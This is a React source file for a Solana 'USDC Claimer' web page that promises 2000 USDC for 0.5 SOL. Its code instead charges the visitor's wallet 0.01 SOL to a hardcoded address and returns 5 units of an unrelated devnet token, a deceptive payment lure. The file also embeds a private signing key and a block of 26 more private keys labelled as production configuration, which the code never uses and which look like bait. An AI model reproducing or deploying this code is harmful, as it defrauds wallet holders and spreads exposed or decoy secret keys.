/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2mLMdDdc1uqtSbW172Ltih4K5N4zdxEV9jHahW13uPead876whwtKfVKrvYLqFA3mXbvT5ziCVJLYM7zZcrfan3P"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3NWk92FneAXjjMDXQ3Wymse8s7t3csuQQqycDmntt8orB3qZu5KBrU7DtpX89REo5ZrQp7cCWYWaLoqx4ijXKs4h",
  "key1": "2baFFkgwSqMHzG4DCGg96jVQ9yM7D8fc5UYhfebo5k4C8pNnTzu5TnBZ8ptNgAErYuBvfWaP3UA4MWotw5K4DLWa",
  "key2": "2dpiqzse5medvChHoZ4Xo11HAcPNfMc9wpgKyQYGiAMY22EV1FM7Rfzm6mSVkWk76wjLMiRUgs4msxys4QJnjE9m",
  "key3": "DKjqeZBnMb9Bvajjn1QWGYJ86sgat2perzYtP7fk4UQFWotjCFeBSiuMuHVpJJYYUKVg3EdkAE6kahUsRYpGDYr",
  "key4": "46G2gC9rZQhXnhN61CqSiKekFFFdzDKXLop55nNbzDuMip2uKvXfW6fCJGYj6gTCtNCPs2xEnjM1buYf8jcAi3cg",
  "key5": "2MBQXKE6i7E46Y8bDns4ZT6DPEEPv19UG9G3SqbwifbfC1icb3JLy5YHDGqrrHHx8okHRZKpqnZA3LwtL1DAcsw6",
  "key6": "2qZhkTxKaWrzjFcpCGcqMHEJGenEHm69zsf87t2Cs3FwPLnCRAzpcoD6DgY64gHPvv3VsREjWbHX73sKxbMoFw63",
  "key7": "2TudZt1iP3LQ7NW7BCcXZX5W6pMNUEab8DAgnpf9QkJVvw4fANdJQwa7QDvwiPmifzqDw34KQ1MgYHH4RKmVh4nh",
  "key8": "3iYnvU8e82FUdTUGB2HfnAddZSQCEx5Ah5dpuanbGqpWMBWHpyTiNJfBjGmNAYVw3hwxSPzBt65ccTCBMk1uA6he",
  "key9": "4EZ1aVArydtwBakzu5aKC1wdUNDsZfrPitVsXThxxhzvgEW3aTfkGT2MjDmVaupvqjTZj4xjpgSVDDGjm4tscBRA",
  "key10": "5hfE34wjGPRfRnfqsLiAMSa8a991cp7G2WT96qGy2Ho81y5D9zpmtp9rqz2xw4UbykfrYzDLZ4HQqxgQgJTs82oq",
  "key11": "2CkiJtvUqVuUY6mKZD8y1BLHKCgkaRYkvaCXdkFMcYUE8vsoHad23MaezK9fSLecczzv4GeTXpJU25cNR8ptB5Mh",
  "key12": "2TY1XAuRnh3J1ybuq27TDRr2MBSpAWiMoY7equoXEuwLC7LdV2FQMt4NNxq7rYRCpRjcX8PTYLrJe4hA4G9Hbsxs",
  "key13": "DDbvmATCCrDDgy26kYqRJaUjoGoH7BWJgy1yCPL1hBNJUEdRnL9Cb4p3Yd9tLEW1iXv3TviuTB6okMoCWfZhbyE",
  "key14": "43VU1tgur3uqdB43HEgUtx8yezTcShsTXdK3kts89bskhwB4CUxnawUQ9vw7cjVqHQX9JGdzS2AEjF6o2R4WZSnX",
  "key15": "5WqidxZ39cV1zrsJBvHD8hxbQjw9Y3bNs7fJCKRSqF3MjhboBUmENcJwgHNs8Udn8tDeS23WM7gnqq7sTebEjqBj",
  "key16": "34pMLdVCH97SKBwopwjuScQRHpEwyMsgrQ57cmkigX3YNwbjwkc6N7nt7JfUoGRpy2Kd56hzYGSH59wa4TwtjTkc",
  "key17": "4waSxjpkXPh1XdYEnMKUEB1hMrfN6sbn9tiKAfR7ZRxpxLn6DxfanmqUszibTyvR9b2FJZYyZ4DLrWaJnsGfShTc",
  "key18": "5u6oVKEDf6dusqkFguLavtiR6vbdb6XL6Tg86G7dEbmEtGYWYToeubxGeizEZsWLbrHqxjKGVSV5L8zvdqbokqby",
  "key19": "62a9YdWaU3p5R4YXqNXBWTemxrYGi6bHRg7qGpxjLDskLZC9hPZCWML5RezNVWfSrZKHFU7JTD4YaGiUzp1SULJn",
  "key20": "3cJ6cP5pndYVpFXgVvb98FvJeNW4sWfQntDoYLwJMeH5KYZVpQXN6DNf9YRSmsXDsKCotBeGbcW7QHY7Yu5UXbAk",
  "key21": "5jx6ucnbDV66mKF2yCdtDTN39BFcP1h4NkPsvuSDRHmk2Vmv4BbXqbWUoP5WNmqJpx3hM76Qm5U8yJunBDQ7Tbhx",
  "key22": "3k8nybxhcX3Cd2DkNT9WZkZZbxANHdy52TeuVkKrp3SLRA3bnZaEYKcmCzWyfemYAXFcRZTrN2b8hV6VvPQrHWfN",
  "key23": "49GwZnaRF55idjsWsBumXmtvSZqnUMUkReDpjPMsfwsa3Pj9NJTiNQDyrJsgLHsVDqRxzUyW4Nx2PqfmwjcJbY33",
  "key24": "38meLnK8AVHxxzJRerjBaGmW81ebjDqMG7Q1uNyZLNyS71kxXXFSFdmjbQDrf3Bwd4KSmitPiX6ePMTS7onj7ngs",
  "key25": "dRpjpzS1rkdpAWaH9UJT5teKi66tghaoeCyfEfD1gWojAnN2XnfmmPBHbeRjeaFLswRgyc88stfZ3PyS3FcLnxb"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
